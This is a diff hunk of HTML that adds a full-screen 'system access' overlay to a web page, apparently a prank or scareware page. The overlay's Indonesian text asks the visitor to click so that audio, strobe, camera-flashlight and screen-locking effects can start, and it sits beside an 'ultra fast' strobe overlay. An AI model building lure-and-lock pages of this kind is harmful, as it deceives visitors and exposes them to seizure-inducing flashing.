@@ -305,6 +305,19 @@
 
 <noscript>Po co ten JavaScript wyłączyłeś bamboszu!</noscript>
 
+<!-- Upfront Permission & Interaction Gate Overlay -->
+<div id="entry-permission-gate" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(10, 15, 20, 0.96); color:#34eb7d; z-index:99999999; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:'Courier New', Consolas, monospace; text-align:center; padding:20px; box-sizing:border-box; user-select:none;">
+  <div style="font-size: 64px; margin-bottom: 10px; animation: wiggle 0.5s infinite alternate;">🚨</div>
+  <h1 style="font-size: 26px; margin: 0 0 10px; color: #ff0055; text-shadow: 0 0 10px #ff0055;">PTOSZEK SYSTEM ACCESS</h1>
+  <p style="font-size: 13px; max-width: 440px; color: #cccccc; line-height: 1.6; margin-bottom: 25px;">
+    Sistem memerlukan izin interaksi awal untuk mengaktifkan seluruh fitur audio, visual, senter kamera, dan penguncian layar.
+  </p>
+  <button id="gate-start-btn" style="background: #34eb7d; color: #000; border: none; padding: 16px 32px; font-size: 18px; font-weight: bold; font-family: monospace; border-radius: 8px; cursor: pointer; box-shadow: 0 0 25px rgba(52, 235, 125, 0.8); transition: transform 0.1s ease, background 0.2s ease;">
+    ▶ UNLOCK FULL EXPERIENCE
+  </button>
+  <div style="font-size: 11px; color: #777; margin-top: 20px;">KLIK / SENTUH UNTUK MEMULAI SEMUA EFEK</div>
+</div>
+
 <!-- Ultra Fast Zero-Delay Strobe Overlay -->
 <div id="ultra-strobe-overlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:999998; opacity:0.65; mix-blend-mode:difference;"></div>
 
